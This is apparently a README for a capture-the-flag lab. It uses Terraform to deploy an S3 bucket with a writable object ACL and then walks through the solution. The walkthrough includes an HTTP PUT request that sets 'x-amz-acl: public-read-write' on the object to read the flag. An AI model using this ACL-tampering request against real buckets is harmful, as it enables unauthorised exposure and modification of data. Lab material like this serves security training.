# Description

English | [中文](./README_CN.md)

This is a script that can help you quickly build a bucket object ACL reading and writing scenario

Although you may not encounter it in a real environment, have fun playing

## Deployment Environment

```bash
cd /TerraformGoat/aws/object_storage_service/object_acl_writable/
```

![image-20220426152245856](../../../images/image-20220426152245856.png)

Configure AWS Access Credentials

```shell
aws configure
```

> You can see the access key in the AWS [Console --> Security Credentials]

```bash
terraform init
```

![image-20220426152354009](../../../images/image-20220426152354009.png)

```bash
terraform apply
```

![image-20220426152417710](../../../images/image-20220426152417710.png)

![image-20220426152428214](../../../images/image-20220426152428214.png)

After typing yes, the scene will be built automatically and quickly

## Get Flag

![image-20220426152550418](../../../images/image-20220426152550418.png)

We see the list of files that try to access index.html

![image-20220426152651701](../../../images/image-20220426152651701.png)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<Error><Code>AccessDenied</Code><Message>Access Denied</Message></Error>
```

Access is forbidden, but we can modify whether the object can be read or written by adding `public-read-write` to `x-amz-acl` in the request header via the PUT method

![image-20220426152744234](../../../images/image-20220426152744234.png)

![image-20220426172410852](../../../images/image-20220426172410852.png)

```http
PUT /index.html?acl HTTP/1.1
Host: hxseclabteztq.s3.eu-west-1.amazonaws.com
x-amz-acl: public-read-write
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

Then we get the ACL of this object and we see that all users can now read and write to it

![image-20220426172506589](../../../images/image-20220426172506589.png)

Afterwards, when you visit index.html, you successfully get the flags

![image-20220426172534934](../../../images/image-20220426172534934.png)

## Destruction Challenge

```bash
terraform destroy
```

![image-20220426173539820](../../../images/image-20220426173539820.png)

enter yes

![image-20220426173554665](../../../images/image-20220426173554665.png)
